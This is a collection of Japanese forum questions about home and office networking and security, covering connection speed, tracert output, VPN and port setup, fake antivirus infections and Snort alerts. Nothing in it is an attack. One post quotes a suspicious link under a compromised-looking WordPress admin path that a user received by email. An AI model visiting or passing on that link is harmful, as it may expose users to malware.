すいません！教えてください＞＜。 自分のＰＣや回線の不調についてです、小さな事でもぜひ知恵をお貸しください； Ｙａｈｏｏの方でも記載させていただきましたが、あちらは返答がしづらい、１人１回のみの回答となって居たので転載に近いですがこちらに書かせて頂きました＾＾； 自分の回線の調子がおかしいのです 自分で試行錯誤してみたのですが、もうどうしたらいいかわからないので知恵をお貸しください； ↓Ｒａｄｉｓｈで計測した結果です 回線速度測定結果 下り回線 速度 5.934Mbps (741.7kByte/sec) 測定品質 0.0 上り回線 速度 609.0Mbps (76.12MByte/sec) 測定品質 93.3 ＰＣを買い替えてから不調になってます ＰＣはギガビット対応って事なので、ＬＡＮをすべてＬｖ６に取り替えました ハブは準備してありますが、使ってない状態です。 それでダメだったので初期不良ということで送り直しＬＡＮカードとの相性が悪かったということなので 増設したＬＡＮカードを取り外して貰いました。 そして再度帰ってきた時に計った速度が上記されてるものです。 ルーターの方も交換してもらいました終端装置は交換していません。 それと自動チューニングに関してですが、一度無効化しＭＴＵを設定してみたら速度が落ちたので 再度自動チューニング機能をＯｎにしてhighlyrestrictedの状態にしてあります。 契約会社さんにも電話して調べてもらっています、言われたやり方もすべて試みました。 ------------------------------------------------------------------------ ＰＣのスペックを記載しておきます、ＰＣに問題があるようならまた初期不良で送ります（３度目） それか返品は承ってないと書かれていますが３度目となるので返金をお願いして別のＰＣを買うという考えもあります。 ＯＳ：Win7 Home Premium 64ビット　この問題が解決したらＰｒｏにする予定です（現状：未購入） ＣＰＵ：メモリ３２ＧＢ ドスパラでの購入で SX-e を改良（増設）したものです。↓のサイトで確認したほうが早いと思いましたので ＵＲＬを記載しておきます。 http://www.dospara.co.jp/5shopping/detail_prime. … ------------------------------------------------------------------------ 契約先と借りてる機械の名前も書きます 契約：ＫＤＤＩ ＤＴＩ auひかりホームお得プラン　ちなみに１Ｇ回線です ルーター：Aterm BL 190HW　　１Ｇ対応ルーターです　カテ６のＬＡＮが使用可能なルーターです 終端装置：H06NU6 ------------------------------------------------------------------------ 記載忘れでしたので追記します ＰＣを購入し、１回目の初期不良の際はＰＣが起動しなかったため確認できていません それで１回目の初期不良から戻ってきた時はＰＣが起動できたので速度を計測し、下りも上りも速度が出ないうえに 回線がブツブツと切れる現象が起きたため業者に連絡し確認のうえで２度目の初期不良として送りなおしました それから戻ってきたら上りは出てるけど下りは出ないという状況になり、こちらへ質問させていただきました ------------------------------------------------------------------------ 質問内容は「回線の改善で下りをまともにしたいor元より早くしたい（以前より出てないため）です」 以前の回線速度のコピペが無いので手打ちになりますが 下り７０Ｍｂｐｓ 上り７０Ｍｂｐｓ カテゴリ低いＬＡＮでこれだけ出ていたというのに下りが５Ｍｂｐｓになっているので改善したいです 初期不良として送り出せるのは＠２週間程ですのでできるだけ早く対処したいです。 他に何を書いていいものかわからないので、一旦これで終了します 初めて書き込みするので、こういう風にして再度書き込みお願いしますとかあれば、やりますので言ってください＞＜。
tracertコマンドとして同じ質問が出ていますが、同じ趣旨と思い投稿しました。 以下の様な結果が出た時、３のホストが非表示設定だが、icmpは通っている（？）と考え、次のホストにTTLを＋１しホップできました。 ホストは移動する。 と、私は考えています。 : 2 40 ms 40 ms 40 ms tokyo-gate.isp.xx.jp [203.xxx.xxx.xxx] 3 * * * 4 40 ms 40 ms 30 ms xxx.xxx.isp.xx.jp [203.xxx.xxx.xxx] しかし、 　2 40 ms 40 ms 40 ms tokyo-gate.isp.xx.jp [203.xxx.xxx.xxx] 3 * * * 4 * * * 　5　　* * * とホップ数が増加しても　*　*　*が最後まで続く場合はどう考えればよいのでしょうか？ 私の考えは そのホップのいづれか(*　*　*　の最初も含む）ホストがicmpの拒否設定（通さない）になっていて、 TTLは＋１されるが、1つのホスト（拒否設定ホスト）から移動していないと考えています。 TTLは＋１されてホップ数は増える。 ホストは移動しない。 正しいでしょうか？
ｈｔｔｐ４００エラーや接続がタイムアウトされましたなどのメッセージが表示される時が結構あるので、 コマンドプロンプトでtracertを実行したら下記のように表示されましたが、 よく分からない部分がありますが、正常でしょうか？ ご存知の方は、説明をよろしくお願いいたします。 ＊＊＊＊下記＊＊＊＊ Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\Users\yoyu>tracert www.naver.com a1694.b.akamai.net [23.15.14.11] へのルートをトレースしています 経由するホップ数は最大 30 です: 1 <1 ms <1 ms <1 ms ntt.setup [192.168.1.1] 2 3 ms 4 ms 7 ms 122.28.24.99 3 4 ms 4 ms 4 ms 122.28.24.97 4 11 ms * 6 ms 221.184.12.217 5 4 ms 6 ms 5 ms 122.28.168.85 6 5 ms 6 ms 4 ms 118.23.168.4 7 6 ms 4 ms 40 ms 122.28.104.174 8 * 5 ms 8 ms 210.163.230.218 9 9 ms 7 ms 5 ms cm-ote232.kddnet.ad.jp [118.155.197.141] 10 6 ms 5 ms 6 ms 111.87.10.14 11 177 ms 187 ms 191 ms a96-7-248-250.deploy.akamaitechnologies.com [96. 7.248.250] 12 5 ms 7 ms 5 ms a23-15-14-11.deploy.akamaitechnologies.com [23.1 5.14.11] トレースを完了しました。 C:\Users\yoyu>tracert www.twitter.com twitter.com [199.59.148.82] へのルートをトレースしています 経由するホップ数は最大 30 です: 1 1 ms <1 ms <1 ms ntt.setup [192.168.1.1] 2 4 ms 6 ms 4 ms 122.28.24.99 3 * 4 ms 6 ms 122.28.24.97 4 6 ms 10 ms * 221.184.12.217 5 4 ms 6 ms 4 ms 122.28.168.85 6 8 ms 7 ms * 60.37.27.153 7 14 ms 18 ms 13 ms ae-5.r21.tokyjp01.jp.bb.gin.ntt.net [129.250.11. 53] 8 117 ms 121 ms 119 ms as-2.r21.snjsca04.us.bb.gin.ntt.net [129.250.4.4 4] 9 120 ms 117 ms * ae-2.r07.snjsca04.us.bb.gin.ntt.net [129.250.5.5 7] 10 132 ms 115 ms 117 ms xe-1.level3.lsanca03.us.bb.gin.ntt.net [129.250. 9.86] 11 164 ms 116 ms 118 ms ae-23-70.car3.SanJose1.Level3.net [4.69.152.69] 12 125 ms 115 ms 119 ms ae-72-72.ebr2.LosAngeles1.Level3.net [4.69.137.2 1] 13 137 ms 127 ms 122 ms ae50.smf1-er2.twttr.com [199.16.159.53] 14 117 ms 122 ms 123 ms ae-2-2.ebr2.SanJose1.Level3.net [4.69.148.142] 15 130 ms 121 ms 132 ms r-199-59-148-82.twttr.com [199.59.148.82] トレースを完了しました。 C:\Users\yoyu>tracert www.yahoo.co.jp www.g.yahoo.co.jp [124.83.235.204] へのルートをトレースしています 経由するホップ数は最大 30 です: 1 <1 ms <1 ms <1 ms ntt.setup [192.168.1.1] 2 5 ms 5 ms 4 ms 122.28.24.99 3 4 ms 7 ms 4 ms 122.28.24.126 4 6 ms 6 ms 6 ms 221.184.12.221 5 5 ms 4 ms 4 ms 122.28.168.89 6 5 ms 6 ms 5 ms 118.23.168.25 7 5 ms 7 ms 5 ms 210.163.230.238 8 16 ms 38 ms 14 ms xe-3-0-0.a21.osakjp01.jp.ra.gin.ntt.net [61.213. 162.206] 9 14 ms 18 ms 20 ms xe-5-1-0.a21.osakjp01.jp.ra.gin.ntt.net [61.200. 82.42] 10 16 ms 19 ms 18 ms 124.83.128.30 11 20 ms 21 ms 16 ms 124.83.128.202 12 19 ms 20 ms 16 ms f9.top.vip.ogk.yahoo.co.jp [124.83.235.204] トレースを完了しました。 C:\Users\yoyu>tracert www.ocn.ne.jp www.ocn.ne.jp [210.163.219.84] へのルートをトレースしています 経由するホップ数は最大 30 です: 1 1 ms 1 ms 1 ms ntt.setup [192.168.1.1] 2 4 ms 4 ms * 122.28.24.99 3 4 ms 6 ms 4 ms 122.28.24.126 4 10 ms 10 ms 8 ms 221.184.12.221 5 33 ms * 4 ms 122.28.168.89 6 4 ms 8 ms 4 ms 118.23.168.86 7 6 ms 11 ms 5 ms 122.28.169.114 8 * 8 ms 11 ms 61.126.89.222 9 * * * 要求がタイムアウトしました。 10 8 ms 8 ms 8 ms 210.163.219.84 トレースを完了しました。 *＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊ 環境： 回線：NTT東日本、光回線（一戸建て）、光電話） プロバイダ：OCN OS:Windows7
教えてください。 DMZにあるWebサーバで証明書を使っている場合、WANからDMZへのhttpやhttpsをFWで開ける必要がありますが、逆にDMZからWANに対してhttpやhttpsを開ける必要がありますでしょうか？ SSLでWebサーバが起点となって発信しているものがあれば必要かと思うのですが。
パソコン（Vista）がUSBウィルスに感染したようで隠しファイルが表示することができずに困っています。状況としては １ 市販のＨＤを購入、接続後元から入っているマニュアル、インストールデータなどをDドライブにコピーしてフォーマットする 2 Ｄドライブ内に保存されていたファイルが表示されていないことが発見、その他のドライブの隠しファイルも表示がされず、通常のファイルを隠しファイルに設定すると表示がされなくなる ３ 普段から隠しファイルを表示するの設定にはしていたが、フォルダオプションで確認したところ隠しファイルを表示するにチェックが入っている （表示しないにチェック後、表示するにチェックしても、効果なし） 4 レジストリのCheckedValueを確認しても数値は1 5 ノートン、NOD32アンチウイルスでスキャンしてもウィルスは検知されず 過去に似たような実例はあるようですが、それらは隠しファイルを表示しないにチェックがもどるとの症状があり私の３の症状に当てはまらずその手順どおりに実行してよいか判断できず 困っています。解決策を教えていただけますでしょうか？ レジストリをいじる、リカバリをするにしても一度cドライブのデータを避難させたいのですが、感染源と疑われるHDに避難させてよいのでしょうか？ また上記の症状がでたあと他のＨＤをつないでしまったのですか、そのHDにも感染した疑いがあるのでしょうか？ 大事なファイルが隠しファイルにしてあったため非常に困っています、どなたか解決策を教えてください
楽天ショップで、クレジットカード（楽天カード）で買い物をしたところで感染しました。 最初から感染したと思いましたが、どうしたらいいのかわからず、最終的に強制終了しました。 そのあと、別のパソコンを立ち上げ、ネットで削除方法を探しshield画面は、でなくはなったのですが 不安なのでスキャンはしました。 削除解説の中で、このshieldはソフトを買わせるためカード番号を入力させて盗むと書いてありました。番号は入力してないのですが、ちょうどタイミングがあうので楽天カードの番号を盗まれてはいないか心配です。今すぐでカードを停止したほうがいいのでしょうか。 ちなみに楽天カードは登録済みのため番号は入力はしていません。回答をお願いします。
表題、そのままなんですけどどんなコマンドでBackupとってます？ L2 L3 Router 各々で。
LinuxのWEBサーバーを運用しています。私の会社では、パスワード(担当者IDとROOT）の変更を毎月1回行っています。 パスワードは１３桁以上、乱数を発生させて英字（大文字、小文字）数字の組み合わせで作っています。 安全性の高いパスワードの作成基準は、桁数が長いことと、意味づけなどがないことですので、基準は満たしていると思いますが、パスワードの変更頻度については基準（考え方）がよくわかりません。 変更頻度についての考え方と、具体的に何日おきに変更しているのか教えていただきたく思います。 よろしくお願いします。
少々昔のパソコンmacのiBookになりますが単純に家族がネットを見たいだけでこのパソコンを起動させました。（私は現在macbookを使用しています。） 昔のパソコンを引っ張りだしました。 GW-US54GXS を差し込み、インターネットをつなげたいのですが現在、eathernetアダプタ（１）でネットワークの状況はつながっています。 しかし、インターネットやサーバーなどはつながりません。 どのようなことが原因なのか、または何か間違いがあるのか、どうしたらインターネットがつながるのか教えて下さい。 とくにゲームとかするわけではありません。
先日、友人から次のURLが掲載されたPCメールが届き、何も考えず、クリックしてしまいまい、ウイルスなど、心配です。 URLは、http://healthylivinghabit.com/wp-admin/googlesav …です。 このURLにある、googlesaveとは一体何なのでしょうか。 よろしくお願いします。
Windowsの共有についての質問です。 Windowsで共有フォルダを作成していなければ、ファイアウォールの設定の有無は関係なしに、LAN内の他のPCから、自分のPCに対してアクセスをされることはないのでしょうか？
Beatというルータへ外部から接続しますが、PPTPが通らないといわれています。 (1)Win-XPノートパソコンThinkPadX60ＷｉＦｉで→EM(イーモバイル)WiFiルータ(GP02)→遠隔地のBeatルータへ接続・・・接続ＮＧ(添付エラー) (2)Win7ノートDELLパソコンWiFiで→EM(以下上記とおなじ構成)→遠隔地のＢｅａｔルータへ接続・・・接続ＯＫ (3)Win-XPノートパソコンThinkPadX60WiFiで→自宅無線ホームステーション→フレッツNext(Niftyプロバイダ)→遠隔地のBeatルータへ接続・・・接続ＯＫ です。 遠隔Ｂｅａｔルータは(1)(2)(3)おなじところです。 なぜか(1)でエラーとなります。(1)と(2)の違いはパソコンが違うだけです（ＯＳも）。とするとX60の問題のようですが、(1)と(3)はパソコンとしても接続する仕方も同じ(WiFi)です。どう考えればいいでしょうか？とりあえずX60の無線アダプターファームは最新のものにＶｅｒＵＰしましたが、症状は変わりません。 どこをチェックすればいいでしょうか？
DHCPサーバであるinfoblox550をAPCのUPS　RT5000VA（その他の機器もあるため、大型のUPSとなっています）で給電する構成を検討中です。 infoblox550を自動シャットダウンするには、どの構成になるかご存知の方、ご回答いただけないでしょうか。 条件は、以下になります。その他不足する情報があれば、ご指摘ください。 ・Infoblox550利用は確定している ・サーバなどを別途必要としない構成を希望。 　UPS、ケーブル（シリアル、LAN接続）のみの構成が望ましい。 ・UPSは、型番違いでも、最悪他社製品でも可 お願いします。
自身が制作・管理するホームページについて、Security Shieldに感染していると連絡を受けました。 閲覧中に突然シャットダウンし、Security Shieldの画面が表示されたというのです。 そこでサイトを不正改ざんされた部分の検知方法を教えて頂きたいのです。 ちなみにこちらで手を尽くした内容は次の通りです。 http://lhsp.s206.xrea.com/misc/linkscan.html にある検証サイトのいくつかでチェックしましたが、全て問題ないという結果が出ました。 自分のPCにはマカフィーが入っていますが、ブロックもされずシャットダウンもしません。 Google検索での表示には、そのサイトにはマカフィーからの安全マークがついております。 色々調べるとHTMLファイルから覚えのないjavaを検出するとありましたが、何が元からあるものかの判別が困難です。 よろしくお願いいたします。
現在、31歳（8月で32歳）になります。以前はテストエンジニアをやっていました。 今から、ネットワークエンジニアを目指そうと考えています。現在の年齢からでは無理でしょうか？ ネットワークの基本となる資格CCNAからの取得を考えています。 他に必要なるスキルがあれば、教えてください。お願いします。
フレッツウイルスクリアのアンインストールを試みようとしましたが 「ユーザーアカウント制御」と出てしまい、できませんでした。 パスワードももちろん覚えてるはずがなく・・・ 解決策を教えてくださいませんか PCはTOSHIBA「QOSMIO」と書いてあるのですが・・・ よくわかりません 情報不足ですいません PCは素人なものですから・・・
現在、v6 ver.7　を使っています パスワードを忘れてしまったため、設定を変更することもできず 大変こまっています 害のないサイトまでをブロックし、 迷惑しています なのでアンインストールをしようと思っています 方法がわからないので詳しく教えていただけませんか？ 再インストールの方法も教えてくれるとありがたいです
いつもお世話になります SSLの仕組み自体は分かっているつもりです、サーバに適用も経験済みです。 ふと疑問なのですが、仮に法人としてSSL認証機関を立ち上げたいと思った場合 そのようなシステムを作ってどこに登録すれば良いのでしょうか？ （公的CA（認証機関）を立ち上げたい、独自CAではない） マレーシアのSSL認証局がセキュリティ不十分だった時に Microsoft、Mozillaとも「Entrust」からの連絡を受けたとのことなので http://www.itmedia.co.jp/enterprise/articles/111 … Entrustに申請して、各ブラウザに反映してもらうような流れなのでしょうか？ 例えばドメインを自前で登録する時は バインドでネームサーバを作って、そのIPを各トップレベルドメインに登録します（jpだったら日本レジストリサービス） そのようなSSL認証を統括している企業があるのか もしくは、Microsoft、Mozilla等に直接申請するのでしょうか 詳しい方、ご教授頂けると嬉しいです！
先日来、JASRAC、財務省、日本レコード協会、民主党等々に、国際ハッカー集団「アノニマス」が 攻撃対象としたとの報道がありますが、（１）今日明日でできる対応策と、（２）中長期にできる対応策を教えてください。（対応策の内容と、費用感がわかればお知らせください。） ちなみに、傘下の企業内のデータベース（社外秘）、ホームページ、メールを 民間のサーバー管理会社に委託し運用しております民間の財団法人です。
すみません、大体のお答えで結構なので、ご指南下さい。 とある事務所があって、そこにVPN対応のルータ（富士通　SIRシリーズ予定）があって、固定IPの設定がされているとします。 そこから離れた別の「　拠点A　」があって、そこにある1台のパソコンから事務所へVPN接続しようとした場合、「　拠点A　」では、やはりVPN対応のルータが必要なのでしょうか？　出来ればWindows7にあるという、VPN機能で繋げたいな～と思うのです。 ちなみに「　拠点A　」では、アクセスラインにFOMAの通信カードを利用する予定です。前記のとおり、PCは1台しかありません。 実際の設定は業者の方に依頼しますが、機器構成としてどうなのかな、と思い質問してみました。 どうぞ、ご指南下さい。よろしくお願いします。
NTTのOG400XaにBUFFALOのWZR2-G300Nを繋いで通信を行っています。 OG400Xaの直接のポート開放は、NTTの技術に問い合わせて、指導通り行っても ダメでした。どうもOG400Xaというのは、ポートを開けさせないものらしいです。 その指導を受けた後にNTTの営業から、OGでのPPPoE接続を無効にして、別のルータを 接続し、そこでポート開放すれば解決しますと言われました。 WZR2-G300Nでポート開放を試すのですが、やはりダメです。 PCですが、Windows７64bit Homeプレミアムです。 82578DCgigabitnetworkConnectionで接続 現在加入しているISPは、固定のグローバルIPを１つ振出している業者です。 回線種別は、NTT西日本フレッツネクストファミリーハイスピード 機器接続は、ONU⇒OG400Xa⇒WZR2-G300N⇒有線LANケーブルでデスクトップです。 ポートチェックを行ったサイトURL：http://www.akakagemaru.info/port/tcpport.php 是非お答えをいただきたいのは、OG400Xaでポート開放ができた！という方が いらっしゃれば、それが1番です。（1GBで繋がります）これがとてもうれしいです。 2番は、上記で説明させていただきました構成で、ポート開放できるという方法を お教えいただきたいです。（100MBに激落ちします） 添付しております画像は、WZR2-G300Nの設定です。 ONU⇒OG400Xa⇒WZR2-G300N⇒有線LANケーブルでデスクトップで PCではファイヤーウォールもディフェンダーも無効にしてみましたがダメです。 私の実力では万策尽きました。是非、解決策をご教授いただけますと幸いです。 宜しくお願い申し上げます。本当に困っています。
今xp sp3にvistaからvpn接続を試みてるのですが、 パスワード承認のところで 接続エラー(確か806だったと思います)が出てしまいます。 ですがxpのファイアウォールを切ると接続できます。 接続後ファイアウォールを入れてログを確認したところ プロトコル47がdropになっていました。 ここが原因なんじゃないかと思ったのですが, xpのファイアウォールの設定のどこを見ても プロトコルを通過させるような設定をできそうな ところが見当たりません！ どなたかご存知の方いませんでしょうか？ よろしくお願いします。
http://detail.chiebukuro.yahoo.co.jp/qa/question … ↑この質問について適切な回答の一例を挙げるとどんな風になるでしょうか？ 後学のために教えてもらえればと思います。 よろしくお願いします。
至急お願いします！ 動画サイトを見ていたら外国のサイトにつながってしまいました それからスマホ（xperiaです）がおかしくなっています ネットワークに全くつながりません つなげようとすると 503error みたいなのが出てきます 全く知識がないので どうすればいいか教えて下さい！ とりあえず、電源を切ってつけたり メールのは開かないでおいてます
質問を失礼します。 私の親がネット上で私のＦＣ２ブログを見つけて毎日のようにチェックしているようなのです。なんとか 親のＰＣからアクセスできないようにしたいのですが、可能でしょうか？当然同居しているのでルーターとプロバイダは同じです。　同居人にブログを見られるのは気持ちが悪いですし、ブログを変更したら、過去のデータの処理やかなりの友人関係にも連絡したりなどややこしいことになるので、同居人からのアクセスだけを拒否したいのです。親は家のＰＣ以外ではパソコンを触る環境にいませんので、親が使用している家のＰＣからのみ拒否できれば全て解決します。どうか方法を伝授していただければと思います。
PCのセキュリテソフトを買おうと思うのですが、どのソフトが一番いいのでしょうか？ たくさんあってわかりません。教えてください！！ お願い致します！！！！
ウイルスバスター2009のパスワードについてなのですが パスワードを設定したのですが いちいちパスワード入力するのがめんどくさいです どうにかなりませんか？
いつもお世話になってます。 今PCを新しく買い直したのでFTPを再度登録したかったのですが、パスワードが●で表示されてしまっているためわかりません。 これはどうすれば●ではなくてパスを表示させることができるのでしょうか？？
先日会社のサーバのSnortを入れました。 下記のアラートの意味についてご存知の方があれば 教えてください。 SHELLCODE x86 inc ecx NOOP [**] [Classification: Executable code was detected] 同サーバがもつ複数IPの443ポートに対してなんらかのスキャンがされているようなの ですが… ちなみに、Version 2.9.0.1 GRE　が入っています。 どうぞよろしくお願いします。
定かではありませんが、スマートフォンに不正アクセスされた可能性があります。（画像データが一部紛失している、自分で削除した憶えはない、盗まれた？） このような場合、以下の質問にお答えいたただける方、よろしくお願いします。 1.マカフィーのセキュリティーソフトがスマホ（ドコモAndroid）には入っています。アプリダウンロードの際は、マカフィーが稼動し必ずスキャンし、感染していないことを確認していましたが、このような場合でも不正アクセスの可能性はあり？ 2.これ以上被害が増えないよう、セキュリティを強化するにも、マカフィーで×だった可能性があるのに、これ以上の強化方法はある？ 3.Google Playからしか、アプリはダウンロードしていませんが、ポイントサイト「●○ナビ」おすすめアプリなどは、やっぱりあやしいでしょうか？ 4.ポイントサイト「●○ナビ」おすすめアプリは、1回ダウンロード・インストールしたものの、あまり使わなさそうなアプリだったため、速攻アンインストールしましたが、１度でもインストールしてしまうと、アンインストールした後でも、不正アクセスの原因になりますか？ 5.被害届などを受け付けて、調査してくれる機関はありますか？ 6.疑いたくはありませんが、つい最近直近でインストールしたアプリは、大手ショッピングモールのアプリ、大手食品メーカーのレシピアプリなどで、このアプリたちが原因の可能性があるとしたら、もう何も信用できないというか。。。(≧△≦；) 以上、いろいろと無知で申し訳ないですが、今度は電話帳などのデータが盗まれやしないか心配で、眠れなくなってしまいました(泣)　何卒、ご回答のほど、よろしくお願いしますm(_ _)m
ムームードメインで独自ドメイン取得後、ロリポップでアップ したのですが、検索してもアップしたページが見つかりません。 DNS登録は完了しています。何か至らぬ点があるのでしょうか？ 教えてください！
ネットワーク初心者です。 スタティックルーティングの設定についてですが、 以下のネットワーク経路でホスト(1)がホスト(2)と通信を行う為には、 ルータAだけではなく、ルータBにもホスト(2)のセグメントへのルーティングを設定しなければならないでしょうか？ 又、ホスト(2)からの返りについても、ルータCだけでなく、ルータBについてもホスト(1)へセグメントへのルーティング設定が必要でしょうか？ ホスト(1)⇒（ルータA）⇒(ルータB)⇒(ルータC）⇒ホスト(2)
NICの種類には、PCI型（デスクトップ機用）とPCカード型（ノート機用）と知りました。 ＰＣカード型のNICには、「PCMCIA」と「Card Bus」とがあるらしいです。 ノート型パソコンの場合、これら二つの中にもさらに細かく種類があると思うのですが、例えばPCMCIAが組み込まれたパソコンがあったとして、このNICをOSに認識させるにはデバイスドライバが必要だと思うのですが、このときに必要なデバイスドライバを選ぶのにPCMCIAの中の細かな種類までは関係ないのでしょうか。
家の中で、Windows7とXPをネットワークでファイルを共有しようと思っているのですが、どうしても出来ません。 現在、Windows7で下記の設定 -------設定--------------------------- コントロールパネル→ネットワークとインターネット→ネットワークと共有センター→共有の詳細設定 ファイルとプリンターの共有 →ファイルとプリンターの共有を有効にする パスワード保護共有 →パスワード保護の共有を無効にする -------設定--------------------------- を行ったところ、XPから共有ファイルが表示されるようになりましたが、ファイルの中のテキストが見れるものと見られないものがあります。 見られないものは「ネットワークリソースを使用するアクセス許可がない可能性があります」と言うエラーが出ます。 見れるものと見られないもののフォルダーの、プロパティをを比較してみましたが、同じ設定でした。 XPから共有ファイルを全て見れるようにしたいのですが、解決方法をご存知の方がいらっしゃったら、教えてください。 （パソコン関連に関しては初心者なので、専門的な事を聞かれると答えられないかも知れません・・・）
お世話になります。 ご面倒かけますが、ご回答頂ければ助かります。 状況を説明させて頂きますと あるプログラム（計算して結果を出力）をネットワーク上で共有フォルダにアクセスして 実行しております。 (1)スタンドアローンで実行（自分のＰＣにプログラムを保存）すると、実行時間が1～2分 (2)ネットワークの共有フォルダにアクセスして実行した場合　5分～10分かかります。 ※できるだけマスタ配布のような業務が入る為、スタンドアローンでは利用しない方針です なぜこんなに実行時間に差がでるのかという質問を頂いてます。 ネットワーク上のプログラムを実行しているのですから、ある程度遅くなるのは 当たり前です。とは回答しているのですが、理解してもらえません。 ＷｉｒｅＳｈａｒｋを利用して、パケットを拾ったのですが ・　TCP Dup ACK ・　TCP Retransmission ・　TCP Previous segment lost 上記のようなパケットを拾いましたが、パケットを分割や再送信を行っているので 遅くなっていると話をしましたが、これがネットワークの問題なのかプログラムの問題か 確認（考え方）するにはどうしたらいいでしょうか？ 参考程度でも結構ですので、お願いいたします。
カスペルスキーをインストールしたら全ての接続が遮断されます。 安全かも知れませんがちょっと不便過ぎます。 Google ChromoeとInternet Explorerで繋がらないことが分かりました。 今までフリーソフトでセキュリティを守って来たのですがお金を払ったのに不便過ぎます。 （一応トレンドマイクロとノートンだった時期もある。） 自信満々の宣伝に釣られたのですが、結局のところ保護を停止しないと繋げられません。 メールで問い合わせようにもユーザー登録しないとメールも受け付けないみたいです。 カスペルスキーは、カスタマーから身を守っているのでしょうか？ 返金とかの選択肢は使いたく有りません。よろしくお願いします。
社内で現在合計４台のPCを使っています。 それぞれワークグループで以前は問題なく各PCから共有フォルダを見に行けていたのですが、あるときから下記の状態で１台だけアクセスできなくなりました。 考えられる要因がわかる方、ご教授下さい。 【各PCの状態】 ・XP　２台（メインXP１台、サブXP１台） ・VISTA　１台 ・７　１台 ワークグループは同一にしているので、各PCからLAN内につなげているPCはネットワーク上で全て見えている状態です。 その内、XP（メイン）以外の各PCから、このXP（メイン）以外の共有ファイルは全てアクセスできます。要するに、XP（メイン）以外の各PCは普通にアクセスできます。 XP(メイン）へのアクセスだけ、どのパソコンからもできません。 【XP(メイン）の現在の状況】 ・ローカルエリアの接続プロパティで、ファイルとプリンタの共有にはチェック入っています。 ・Windowsファイヤーウォールで、「除外」項目にファイルとプリンタの共有にはチェックが入っています。 ・インストールしているウイルス対策ソフト（XP（メイン））：Kingsoft AntiVirus ・Kingsoft personal Firewall　のローカルネットレベル：低 ※試しに、このKingsoft AntiVirusのリアルタイムガードを一旦停止にしてもアクセスできません。 また、Kingsoft Personal Firewallのファイヤーウォールを停止にしてもアクセスできません。 他、考えられる事があればご教授願います。
素人のネット管理者です。 今までインターネットが出来ていたのに、急につながらなくなりました。 HTTPエラーで500が出ています。 fortigateの保守契約を切ったのが原因かと思っております。 ネトモニで通信はキャプチャしてみましたが、 見方がわかりません。 どのように調べれば解決できるかご教授頂けないでしょうか。 ■現象 PCをwindows7に交換 ↓ しばらくインターネット接続可能 ↓ fortigate100aの保守契約解除？(これ以外には思い当たるイベント無し) ↓ インターネット不通 ※HTTP 500エラー ※メールの送受信可能 ■プロバイダ NTT西日本 ■クライエントPC windows7 pro 32bit ■firewall fortigqate100A
【同一ネットワーク内に複数のルータが存在する場合のルーティングについて】 (1)以下のネットワークが存在するとします。 ネットワーク名：ネットワークA ネットワークアドレス：192.168.100.0 サブネットマスク：255.255.255.0 (2)また、上記ネットワーク内に以下の2ルータが存在しそれぞれが異なるネットワークとVPN接続されているとします。 ルータ1：192.168.100.1 →ネットワークBとVPN接続 ルータ2：192.168.100.2 →ネットワークCとVPN接続 ネットワークB：192.168.150.0/24 ネットワークC：192.168.200.0/24 (3)ネットワークA内にサーバXが存在しIPとデフォルトゲートウェイは以下の通りです。 サーバ名：サーバX IPアドレス：192.168.100.101 サブネットマスク：25.255.255.0 デフォルトゲートウェイ：192.168.100.1（ルータ1） ＜質問＞ このような環境下で、サーバXがネットワークCと通信したい場合、サーバ自体またはサーバXのデフォルトゲートウェイ上にルーティングは必要でしょうか？ 具体的にはWindowsのコマンドで言えば以下のようなルーティング必要かどうか、ということです。 add 192.168.200.0 mask 255.255.255.0 192.168.100.2 私自身はルーティングをしなければいけない、と思っているのですが、ネットワークCへの接続の窓口となっているルータ2がサーバXと同じネットワーク内にあるから必要ないという意見もあり、どちらが正しいのかを知りたいです。仮に後者が正解の場合は、なぜそのような通信が可能なのかを知りたいと思っています。 分かりにくい説明となってしまっているかもしれませんが、どなたかお知恵をいただけると大変助かります。
dvdshrinkを再度インストールしようとしています。前回は簡単に出来たのですが今回はWinZipの使用版で解凍しました。いざ解凍しようとすると安全でないとのメッセージがでました。 dvdshrink3201_jp_setup(4)をパソコンに保存してdvdshrink32_jp_setup?exeを解凍しようとしたところメッッセージが出ました。果たして安全でしょうか。
NFSクライアントからNFSサーバーへのファイルアップロード、NFSサーバーからNFSクライアントへのファイルダウンロード時間がどのくらいかかったか計測したいと考えております。 計測する方法をご教示頂けますようお願い致します。 ------------------------- NFSサーバー：CentOS5.6 NFSクライアント：CentOS5.6 -------------------------
こんにちは。 初心者に毛が生えた程度の知識しかありません。 宜しくお願い致します。 あるシステムに全く違う場所にあるWEBサーバからアクセスできるように設定する事になり、いろいろ調べています。 当初全く知識が無かったのでGlobal IPを取得する必要があるかと思ったんですが、もう少し調べているとダイナミックDNSサービスと言うものがある事を知りました。 無料もたくさんあるのですが、DICEというプログラムで再起動時などにIPが変化した際にドメイン名を更新できる事もわかりました。 しかし一応お客様に提供するものなので、DICE等が必要ない状態で行えないか現在調べています。 初期に少し金額が掛かっても良いのですが、なるべく月額など掛からないで使用できるのが理想です。プロバイダに縛られないものに限られます。 上記は私が自力で調べたのでもしかしたら間違えているかもしれないのです。。 どなたかお勧めを教えて下さい！！ 宜しくお願いします。
　こんにちは、Win XP です、PCの初心者です、宜しくお願いします。 　インタ-ネットオプション＞セキュリティ設定＞の設定項目に 「ActiveXコントロールとプラグイン」と「スクリプト」について設定する項目がありますが、 両者は同じものではないのでしょうか。 　違うものであればどのように違うものなのでしょうか。 　また、ActiveXコントロールとは、JavaアプレットとかASPみたいなものも含まれるのでしょうか。 　宜しくお願いします。
私の高校では先生が私達生徒のデコログを監視しているのですが、パスを付けた記事も見ていると言っていますし、実際パスを付けた記事の内容を知っています。何かそういったソフトなどがあるのでしょうか？また、それを防ぐ方法はあるのでしょうか？皆不審に思っているので教えて下されば幸いです。
windows secure web patch という、 擬似セキュリティソフトウイルスに感染してしまいました。 インターネットに接続時、このソフトが邪魔をしてネット画面が閉じられてしまいます。 現在はスマホでネット接続している状態で、そこから、ネットないの改善方法を検索したのですが、 ネット内のソフトをインストールするという、改善方法が出てきました。 ネットにせつぞくできないのに。。 同様の問題を解決した方がいらっしゃれば、是非ご教示頂けないかと思い、投稿致しました。 ご協力よろしくお願いします。
もしも、ネット上でのなりすましを見つけたら、どのような対処をすればよいでしょうか？
